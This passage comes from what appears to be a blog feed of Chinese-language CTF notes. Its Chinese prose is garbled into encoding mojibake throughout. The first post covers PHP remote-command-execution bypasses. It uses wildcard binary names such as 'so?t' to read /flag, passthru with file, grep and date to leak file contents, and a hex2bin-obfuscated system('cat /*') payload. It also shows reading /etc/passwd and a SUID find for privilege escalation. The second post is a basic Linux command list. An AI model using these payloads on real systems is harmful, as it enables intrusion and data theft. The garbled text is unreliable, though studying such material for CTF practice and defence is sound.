title="xxdï¼šè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶"></a>xxdï¼šè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶</h3><p>xxd &#x2F;flag</p><h3 id="sortï¼šä¸»è¦ç”¨äºæ’åºæ–‡ä»¶"><a href="#sortï¼šä¸»è¦ç”¨äºæ’åºæ–‡ä»¶" class="headerlink" title="sortï¼šä¸»è¦ç”¨äºæ’åºæ–‡ä»¶"></a>sortï¼šä¸»è¦ç”¨äºæ’åºæ–‡ä»¶</h3><p>so?t &#x2F;flag</p><h3 id="usr-bin-s-rt-flag"><a href="#usr-bin-s-rt-flag" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;s?rt &#x2F;flag"></a>&#x2F;usr&#x2F;bin&#x2F;s?rt &#x2F;flag</h3><p>&#x2F;usr&#x2F;bin&#x2F;sort å’Œ sort å®é™…ä¸Šæ˜¯åŒä¸€ä¸ªå‘½ä»¤ã€‚&#x2F;usr&#x2F;bin ç›®å½•æ˜¯ç³»ç»Ÿçš„æ ‡å‡†ç›®å½•ä¹‹ä¸€ï¼Œå®ƒåŒ…å«äº†è®¸å¤šç³»ç»Ÿå‘½ä»¤å’Œå·¥å…·çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œ sort å‘½ä»¤é€šå¸¸å°±å­˜æ”¾åœ¨ &#x2F;usr&#x2F;bin ç›®å½•ä¸­,å› æ­¤&#x2F;usr&#x2F;bin&#x2F;sort &#x2F;flag å’Œ sort &#x2F;flag æ˜¯ç­‰ä»·çš„ã€‚æœ‰æ—¶å€™sortä¸è¡Œå¯èƒ½&#x2F;usr&#x2F;bin&#x2F;s?rtå¯ä»¥</p><h3 id="uniqï¼šæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œï¼Œå…¶å®å½“æˆcatç”¨å°±è¡Œ"><a href="#uniqï¼šæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œï¼Œå…¶å®å½“æˆcatç”¨å°±è¡Œ" class="headerlink" title="uniqï¼šæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œï¼Œå…¶å®å½“æˆcatç”¨å°±è¡Œ"></a>uniqï¼šæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œï¼Œå…¶å®å½“æˆcatç”¨å°±è¡Œ</h3><h3 id="file-f-æŠ¥é”™å‡ºå…·ä½“å†…å®¹"><a href="#file-f-æŠ¥é”™å‡ºå…·ä½“å†…å®¹" class="headerlink" title="file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹"></a>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</h3><p>passthru(â€œfile -f &#x2F;flagâ€);</p><h3 id="grepï¼šåœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ä¸²"><a href="#grepï¼šåœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ä¸²" class="headerlink" title="grepï¼šåœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ä¸²"></a>grepï¼šåœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ä¸²</h3><blockquote><p>passthru(â€œgrep fla &#x2F;fla*â€);</p></blockquote><h3 id="stringsï¼š"><a href="#stringsï¼š" class="headerlink" title="stringsï¼š"></a>stringsï¼š</h3><p>ç›¸å½“äºcat</p><h3 id="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.txt</span><br></code></pre></td></tr></table></figure><p> ææƒls &#x2F;-al</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span> &gt;1.txt<br></code></pre></td></tr></table></figure><h4 id="1-find"><a href="#1-find" class="headerlink" title="1. find /"></a><strong>1. <code>find /</code></strong></h4><ul><li><p><strong>ä½œç”¨</strong>ï¼šä»æ ¹ç›®å½• <code>/</code> å¼€å§‹é€’å½’æœç´¢æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚</p></li><li><p>**ä¸ºä»€ä¹ˆç”¨ <code>/</code>**ï¼šè¡¨ç¤ºæœç´¢æ‰€æœ‰ç›®å½•å’Œå­ç›®å½•ï¼Œç¡®ä¿ä¸é—æ¼ä»»ä½•æ–‡ä»¶ã€‚</p><table><thead><tr><th align="left">åŠŸèƒ½</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æŒ‰æ–‡ä»¶åæŸ¥æ‰¾</td><td align="left"><code>find / -name &quot;flag*&quot;</code>(ä»¥flagå¼€å¤´çš„æ–‡ä»¶)</td></tr><tr><td align="left">æŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾</td><td align="left"><code>find / -type f</code>ï¼ˆæ–‡ä»¶ï¼‰æˆ– <code>-type d</code>ï¼ˆç›®å½•ï¼‰</td></tr><tr><td align="left">æŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾</td><td align="left"><code>find / -size +10M</code>ï¼ˆå¤§äº10MBçš„æ–‡ä»¶ï¼‰</td></tr><tr><td align="left">æŒ‰ä¿®æ”¹æ—¶é—´æŸ¥æ‰¾</td><td align="left"><code>find / -mtime -7</code>ï¼ˆ7å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼‰</td></tr><tr><td align="left">å¯¹æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œæ“ä½œ</td><td align="left"><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code>ï¼ˆåˆ é™¤æ‰€æœ‰.logæ–‡ä»¶ï¼‰</td></tr></tbody></table><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*flag*&quot;</span>  ï¼ˆæ–‡ä»¶åä¸­å«æœ‰<span class="hljs-built_in">flag</span>ï¼‰<br></code></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">system</span>(&#x27;find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;/<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span>&#x27;);<br></code></pre></td></tr></table></figure><ol><li><code>find</code> - è¿™æ˜¯ Unix&#x2F;Linux ç³»ç»Ÿä¸­ç”¨äºæœç´¢æ–‡ä»¶çš„å‘½ä»¤</li><li><code>/</code> - æŒ‡å®šæœç´¢çš„èµ·å§‹ç›®å½•ï¼Œè¿™é‡Œæ˜¯æ ¹ç›®å½•ï¼Œè¡¨ç¤ºæœç´¢æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿ</li><li><code>-type f</code> - é™åˆ¶åªæœç´¢æ™®é€šæ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬ç›®å½•ã€è®¾å¤‡æ–‡ä»¶ç­‰ï¼‰<ul><li><code>f</code> è¡¨ç¤º regular fileï¼ˆæ™®é€šæ–‡ä»¶ï¼‰</li></ul></li><li><code>-name &quot;*flag*&quot;</code> - æŒ‡å®šè¦æœç´¢çš„æ–‡ä»¶åæ¨¡å¼<ul><li><code>*flag*</code> è¡¨ç¤ºæ–‡ä»¶åä¸­åŒ…å« â€œflagâ€ è¿™ä¸ªè¯ï¼ˆå‰åå¯ä»¥æœ‰ä»»æ„å­—ç¬¦ï¼‰</li><li>ä¾‹å¦‚ï¼šflag.txtã€my_flag_fileã€flag_backup ç­‰éƒ½ä¼šè¢«åŒ¹é…</li></ul></li><li><code>2&gt;/dev/null</code> - é”™è¯¯è¾“å‡ºé‡å®šå‘<ul><li><code>2&gt;</code> è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡º(stderr)é‡å®šå‘</li><li><code>/dev/null</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡ï¼Œä¼šä¸¢å¼ƒæ‰€æœ‰å†™å…¥å®ƒçš„æ•°æ®</li><li>è¿™æ ·åšçš„ç›®çš„æ˜¯éšè—æ‰€æœ‰é”™è¯¯æ¶ˆæ¯ï¼ˆå¦‚æƒé™ä¸è¶³æ— æ³•è®¿é—®æŸäº›ç›®å½•ç­‰ï¼‰</li></ul></li></ol></li></ul><h4 id="2-user-root"><a href="#2-user-root" class="headerlink" title="2. -user root"></a><strong>2. <code>-user root</code></strong></h4><ul><li><strong>ä½œç”¨</strong>ï¼šåªæŸ¥æ‰¾å±ä¸»ï¼ˆownerï¼‰æ˜¯ <strong>root</strong> çš„æ–‡ä»¶ã€‚</li><li><strong>ä¸ºä»€ä¹ˆé™åˆ¶ root</strong>ï¼šå› ä¸º SUID æ–‡ä»¶å¦‚æœæ˜¯ root æ‰€æœ‰ï¼Œè¿è¡Œæ—¶å¯ä»¥è·å– root æƒé™ï¼Œå¯èƒ½å­˜åœ¨ææƒé£é™©ã€‚</li></ul><h4 id="3-perm-4000"><a href="#3-perm-4000" class="headerlink" title="3. -perm -4000"></a><strong>3. <code>-perm -4000</code></strong></h4><ul><li><strong>ä½œç”¨</strong>ï¼šæŸ¥æ‰¾è®¾ç½®äº† <strong>SUID ä½ï¼ˆSet User IDï¼‰</strong> çš„æ–‡ä»¶ã€‚</li><li><strong>SUID æ˜¯ä»€ä¹ˆ</strong>ï¼š<ul><li>å½“æ™®é€šç”¨æˆ·æ‰§è¡Œ SUID æ–‡ä»¶æ—¶ï¼Œè¯¥ç¨‹åºä¼šä»¥ <strong>æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆrootï¼‰çš„æƒé™</strong> è¿è¡Œã€‚</li><li>ä¾‹å¦‚ï¼š<code>/bin/passwd</code> æ˜¯ SUID æ–‡ä»¶ï¼Œæ™®é€šç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ä¸´æ—¶è·å¾— root æƒé™ã€‚</li></ul></li><li><strong><code>-4000</code> çš„å«ä¹‰</strong>ï¼š<ul><li><code>4</code> ä»£è¡¨ SUID æ ‡å¿—ï¼ˆ<code>chmod u+s</code> è®¾ç½®çš„æƒé™ï¼‰ã€‚</li><li><code>-</code> è¡¨ç¤º <strong>è‡³å°‘</strong> è¦æœ‰ SUID ä½ï¼ˆå¯èƒ½è¿˜æœ‰å…¶ä»–æƒé™ï¼‰ã€‚</li></ul></li></ul><h4 id="4-print"><a href="#4-print" class="headerlink" title="4. -print"></a><strong>4. <code>-print</code></strong></h4><ul><li><strong>ä½œç”¨</strong>ï¼šæ‰“å°åŒ¹é…çš„æ–‡ä»¶è·¯å¾„ï¼ˆé»˜è®¤è¡Œä¸ºï¼Œå¯çœç•¥ï¼‰ã€‚</li></ul><h4 id="5-2-dev-null"><a href="#5-2-dev-null" class="headerlink" title="5. 2&gt;/dev/null"></a><strong>5. <code>2&gt;/dev/null</code></strong></h4><ul><li><strong>ä½œç”¨</strong>ï¼šå°†é”™è¯¯ä¿¡æ¯ï¼ˆå¦‚ <code>Permission denied</code>ï¼‰ä¸¢å¼ƒï¼Œé¿å…å¹²æ‰°ç»“æœã€‚</li><li><strong>ä¸ºä»€ä¹ˆéœ€è¦</strong>ï¼šæ™®é€šç”¨æˆ·è¿è¡Œ <code>find /</code> æ—¶ï¼Œå¾ˆå¤šç³»ç»Ÿç›®å½•æ— æƒé™è®¿é—®ï¼Œä¼šæŠ¥é”™ã€‚</li></ul><h4 id="6-1-txt"><a href="#6-1-txt" class="headerlink" title="6. &gt;1.txt"></a><strong>6. <code>&gt;1.txt</code></strong></h4><ul><li><strong>ä½œç”¨</strong>ï¼šå°†æ ‡å‡†è¾“å‡ºï¼ˆå³æ‰¾åˆ°çš„æ–‡ä»¶åˆ—è¡¨ï¼‰é‡å®šå‘åˆ° <code>1.txt</code> æ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºåœ¨ç»ˆç«¯ã€‚</li></ul><h2 id="ç¨‹åºæ‰§è¡Œ-å½“ä½œphpä»£ç æ‰§è¡Œ"><a href="#ç¨‹åºæ‰§è¡Œ-å½“ä½œphpä»£ç æ‰§è¡Œ" class="headerlink" title="ç¨‹åºæ‰§è¡Œ(å½“ä½œphpä»£ç æ‰§è¡Œ)"></a>ç¨‹åºæ‰§è¡Œ(å½“ä½œphpä»£ç æ‰§è¡Œ)</h2><p>readfile æ–‡ä»¶è¯»å–</p><p>fread(fopen(â€˜&#x2F;etc&#x2F;passwdâ€™,â€™râ€™),100);</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">aaa</span>=hex2bin(<span class="hljs-string">&#x27;73797374656D&#x27;</span>)(hex2bin(<span class="hljs-string">&#x27;636174202f2a&#x27;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>hex2bin(â€˜å‚æ•°â€™); è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><p>&#x2F;bin&#x2F;date -f&#x2F;flag 2&gt;1.txt</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxå¸¸è§æ–‡ä»¶å’Œç›®å½•æ“ä½œå‘½ä»¤</title>
    <link href="/2025/04/06/Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/04/06/Linux%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Linuxå¸¸è§æ–‡ä»¶å’Œç›®å½•æ“ä½œå‘½ä»¤"><a href="#Linuxå¸¸è§æ–‡ä»¶å’Œç›®å½•æ“ä½œå‘½ä»¤" class="headerlink" title="Linuxå¸¸è§æ–‡ä»¶å’Œç›®å½•æ“ä½œå‘½ä»¤"></a>Linuxå¸¸è§æ–‡ä»¶å’Œç›®å½•æ“ä½œå‘½ä»¤</h1><h2 id="cat-1-txt"><a href="#cat-1-txt" class="headerlink" title="cat &gt;1.txt"></a>cat &gt;1.txt</h2><ol><li>**<code>cat</code>**ï¼šåŸæœ¬ç”¨äºæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼Œä½†åœ¨è¿™é‡Œç”¨äºæ¥æ”¶è¾“å…¥ã€‚</li><li><strong><code>&gt;</code><strong>ï¼šé‡å®šå‘ç¬¦å·ï¼Œè¡¨ç¤ºå°†è¾“å‡ºï¼ˆè¿™é‡Œæ˜¯é”®ç›˜è¾“å…¥çš„å†…å®¹ï¼‰å†™å…¥åˆ°åé¢çš„æ–‡ä»¶ï¼ˆ<code>example.txt</code>ï¼‰ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œä¼š</strong>è¦†ç›–åŸæœ‰å†…å®¹</strong>ï¼›å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¼š<strong>æ–°å»ºæ–‡ä»¶</strong>ã€‚</li><li><strong>æµç¨‹</strong>ï¼š<ul><li>è¾“å…¥å‘½ä»¤åï¼Œå…‰æ ‡ä¼šç­‰å¾…ä½ é”®å…¥å†…å®¹ã€‚</li><li>è¾“å…¥ä»»æ„æ–‡æœ¬ï¼ˆæŒ‰å›è½¦æ¢è¡Œï¼‰ã€‚</li><li>ç»“æŸæ—¶æŒ‰ <code>Ctrl+D</code>ï¼ˆLinux&#x2F;Macï¼‰æˆ– <code>Ctrl+Z</code>ï¼ˆWindowsï¼‰ï¼Œå†…å®¹ä¼šä¿å­˜åˆ° <code>example.txt</code>ã€‚</li></ul></li></ol><h2 id="touchåˆ›å»ºæ–°æ–‡ä»¶-mkdiræ–‡ä»¶å¤¹-chmodå˜æ›´æƒé™"><a href="#touchåˆ›å»ºæ–°æ–‡ä»¶-mkdiræ–‡ä»¶å¤¹-chmodå˜æ›´æƒé™" class="headerlink" title="touchåˆ›å»ºæ–°æ–‡ä»¶&#x2F;mkdiræ–‡ä»¶å¤¹&#x2F;chmodå˜æ›´æƒé™"></a>touchåˆ›å»ºæ–°æ–‡ä»¶&#x2F;mkdiræ–‡ä»¶å¤¹&#x2F;chmodå˜æ›´æƒé™</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">touch [file]        åˆ›å»ºæ–°çš„ç©ºæ–‡ä»¶<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">chmod               å˜æ›´æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™<br></code></pre></td></tr></table></figure><p>mkdir seoraåˆ›å»ºæ–‡ä»¶å¤¹</p><h2 id="cdæ‰“å¼€æ–‡ä»¶å¤¹"><a href="#cdæ‰“å¼€æ–‡ä»¶å¤¹" class="headerlink" title="cdæ‰“å¼€æ–‡ä»¶å¤¹"></a>cdæ‰“å¼€æ–‡ä»¶å¤¹</h2><p>cd seora æ‰“å¼€æ–‡ä»¶å¤¹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">nano / vim / emacs  å­—ç¬¦ç»ˆç«¯çš„æ–‡æœ¬ç¼–è¾‘å™¨<br></code></pre></td></tr></table></figure><h2 id="cpå¤åˆ¶æ–‡ä»¶å†…å®¹"><a href="#cpå¤åˆ¶æ–‡ä»¶å†…å®¹" class="headerlink" title="cpå¤åˆ¶æ–‡ä»¶å†…å®¹"></a>cpå¤åˆ¶æ–‡ä»¶å†…å®¹</h2><p>cp ç”¨äºå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½• cp1.txt &#x2F;seora</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">cp [file1] [file2]  ç”¨æ¥å°†ä¸€ä¸ªæˆ–å¤šä¸ªæºæ–‡ä»¶æˆ–è€…ç›®å½•å¤åˆ¶åˆ°æŒ‡å®šçš„ç›®çš„æ–‡ä»¶æˆ–ç›®å½•<br></code></pre></td></tr></table></figure><p>å¤åˆ¶åˆ°æœ€åä¸€ä¸ªæ–‡ä»¶é‡Œ</p><h2 id="mvç§»åŠ¨æ–‡ä»¶"><a href="#mvç§»åŠ¨æ–‡ä»¶" class="headerlink" title="mvç§»åŠ¨æ–‡ä»¶"></a>mvç§»åŠ¨æ–‡ä»¶</h2><p>mvç§»åŠ¨æ–‡ä»¶</p><h2 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">rm [file]           å¯ä»¥åˆ é™¤ä¸€ä¸ªç›®å½•ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•ï¼Œä¹Ÿå¯ä»¥å°†æŸä¸ªç›®å½•åŠå…¶ä¸‹å±çš„æ‰€æœ‰æ–‡ä»¶åŠå…¶å­ç›®å½•å‡åˆ é™¤æ‰<br></code></pre></td></tr></table></figure><h2 id="ç³»ç»Ÿä»»åŠ¡è¿›ç¨‹"><a href="#ç³»ç»Ÿä»»åŠ¡è¿›ç¨‹" class="headerlink" title="ç³»ç»Ÿä»»åŠ¡è¿›ç¨‹"></a>ç³»ç»Ÿä»»åŠ¡è¿›ç¨‹</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ps                  ç”¨äºæŠ¥å‘Šå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹çŠ¶æ€<br></code></pre></td></tr></table></figure><p>ï¼ˆä»»åŠ¡ç®¡ç†å™¨ï¼‰</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">top                 å®æ—¶æŸ¥çœ‹ç³»ç»Ÿçš„æ•´ä½“è¿è¡Œæƒ…å†µ<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">kill                æ€æ­»ä¸€ä¸ªè¿›ç¨‹<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">netstat             æ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨å’Œç½‘ç»œæ¥å£ä¿¡æ¯<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">nc(netcat)          å»ºç«‹ TCP å’Œ UDP è¿æ¥å¹¶ç›‘å¬<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">su                  åˆ‡æ¢å½“å‰ç”¨æˆ·èº«ä»½åˆ°å…¶ä»–ç”¨æˆ·èº«ä»½<br></code></pre></td></tr></table></figure><h2 id="findæŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½•"><a href="#findæŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½•" class="headerlink" title="findæŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½•"></a>findæŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½•</h2><p><code>find</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„<strong>æ–‡ä»¶æœç´¢å·¥å…·</strong>ï¼Œä¸»è¦ç”¨äºï¼š</p><ol><li><strong>æŸ¥æ‰¾æ–‡ä»¶å’Œç›®å½•</strong>ï¼ˆåŸºäºåç§°ã€ç±»å‹ã€å¤§å°ã€æ—¶é—´ç­‰æ¡ä»¶ï¼‰</li><li><strong>å¯¹æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œæ“ä½œ</strong>ï¼ˆå¦‚åˆ é™¤ã€å¤åˆ¶ã€ä¿®æ”¹æƒé™ç­‰ï¼‰</li></ol><h3 id="ä¸»è¦åŠŸèƒ½"><a href="#ä¸»è¦åŠŸèƒ½" class="headerlink" title="ä¸»è¦åŠŸèƒ½"></a>ä¸»è¦åŠŸèƒ½</h3><table><thead><tr><th align="left">åŠŸèƒ½</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æŒ‰æ–‡ä»¶åæŸ¥æ‰¾</td><td align="left"><code>find / -name &quot;flag*&quot;</code>(ä»¥flagå¼€å¤´çš„æ–‡ä»¶)</td></tr><tr><td align="left">æŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾</td><td align="left"><code>find / -type f</code>ï¼ˆæ–‡ä»¶ï¼‰æˆ– <code>-type d</code>ï¼ˆç›®å½•ï¼‰</td></tr><tr><td align="left">æŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾</td><td align="left"><code>find / -size +10M</code>ï¼ˆå¤§äº10MBçš„æ–‡ä»¶ï¼‰</td></tr><tr><td align="left">æŒ‰ä¿®æ”¹æ—¶é—´æŸ¥æ‰¾</td><td align="left"><code>find / -mtime -7</code>ï¼ˆ7å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼‰</td></tr><tr><td align="left">å¯¹æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œæ“ä½œ</td><td align="left"><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code>ï¼ˆåˆ é™¤æ‰€æœ‰.logæ–‡ä»¶ï¼‰</td></tr></tbody></table><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*flag*&quot;</span>  ï¼ˆæ–‡ä»¶åä¸­å«æœ‰<span class="hljs-built_in">flag</span>ï¼‰<br></code></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">system</span>(&#x27;find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;/<span class="hljs-built_in">dev</span>/<span class="hljs-built_in">null</span>&#x27;);<br></code></pre></td></tr></table></figure><ol><li><code>find</code> - è¿™æ˜¯ Unix&#x2F;Linux ç³»ç»Ÿä¸­ç”¨äºæœç´¢æ–‡ä»¶çš„å‘½ä»¤</li><li><code>/</code> - æŒ‡å®šæœç´¢çš„èµ·å§‹ç›®å½•ï¼Œè¿™é‡Œæ˜¯æ ¹ç›®å½•ï¼Œè¡¨ç¤ºæœç´¢æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿ</li><li><code>-type f</code> - é™åˆ¶åªæœç´¢æ™®é€šæ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬ç›®å½•ã€è®¾å¤‡æ–‡ä»¶ç­‰ï¼‰<ul><li><code>f</code> è¡¨ç¤º regular fileï¼ˆæ™®é€šæ–‡ä»¶ï¼‰</li></ul></li><li><code>-name &quot;*flag*&quot;</code> - æŒ‡å®šè¦æœç´¢çš„æ–‡ä»¶åæ¨¡å¼<ul><li><code>*flag*</code> è¡¨ç¤ºæ–‡ä»¶åä¸­åŒ…å« â€œflagâ€ è¿™ä¸ªè¯ï¼ˆå‰åå¯ä»¥æœ‰ä»»æ„å­—ç¬¦ï¼‰</li><li>ä¾‹å¦‚ï¼šflag.txtã€my_flag_fileã€flag_backup ç­‰éƒ½ä¼šè¢«åŒ¹é…</li></ul></li><li><code>2&gt;/dev/null</code> - é”™è¯¯è¾“å‡ºé‡å®šå‘<ul><li><code>2&gt;</code> è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡º(stderr)é‡å®šå‘</li><li><code>/dev/null</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡ï¼Œä¼šä¸¢å¼ƒæ‰€æœ‰å†™å…¥å®ƒçš„æ•°æ®</li><li>è¿™æ ·åšçš„ç›®çš„æ˜¯éšè—æ‰€æœ‰é”™è¯¯æ¶ˆæ¯ï¼ˆå¦‚æƒé™ä¸è¶³æ— æ³•è®¿é—®æŸäº›ç›®å½•ç­‰ï¼‰</li></ul></li></ol><h2 id="æ–‡ä»¶çš„å‹ç¼©å’Œå¤‡ä»½"><a href="#æ–‡ä»¶çš„å‹ç¼©å’Œå¤‡ä»½" class="headerlink" title="æ–‡ä»¶çš„å‹ç¼©å’Œå¤‡ä»½"></a>æ–‡ä»¶çš„å‹ç¼©å’Œå¤‡ä»½</h2><h3 id="gzipå‘½ä»¤"><a href="#gzipå‘½ä»¤" class="headerlink" title="gzipå‘½ä»¤"></a>gzipå‘½ä»¤</h3><p>æ ¼å¼ï¼šgzip [é€‰é¡¹] [æ–‡ä»¶â€¦]</p><p>è¯´æ˜ï¼šgzipå‹ç¼©ä¼šäº§ç”Ÿåç¼€ä¸ºâ€œ.gzâ€çš„å‹ç¼©æ–‡ä»¶ï¼Œå¹¶åˆ é™¤åŸå§‹æ–‡ä»¶</p><p>å¸¸ç”¨é€‰é¡¹ï¼š</p><p>-cï¼šå‹ç¼©åæ–‡ä»¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œä¸æ”¹å˜åŸå§‹æ–‡ä»¶</p><p>-dï¼šè§£å¼€å‹ç¼©æ–‡ä»¶</p><p>-fï¼šå¼ºè¡Œå‹ç¼©æ–‡ä»¶</p><p>-nï¼šå‹ç¼©æ–‡ä»¶æ—¶ï¼Œä¸ä¿å­˜åŸæ¥çš„æ–‡ä»¶åç§°åŠæ—¶é—´æˆ³è®°</p><p>-Nï¼šå‹ç¼©æ–‡ä»¶æ—¶ï¼Œä¿å­˜åŸæ¥çš„æ–‡ä»¶åç§°åŠæ—¶é—´æˆ³è®°</p><p>-rï¼šé€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†</p><h3 id="zipå‹ç¼©å‘½ä»¤"><a href="#zipå‹ç¼©å‘½ä»¤" class="headerlink" 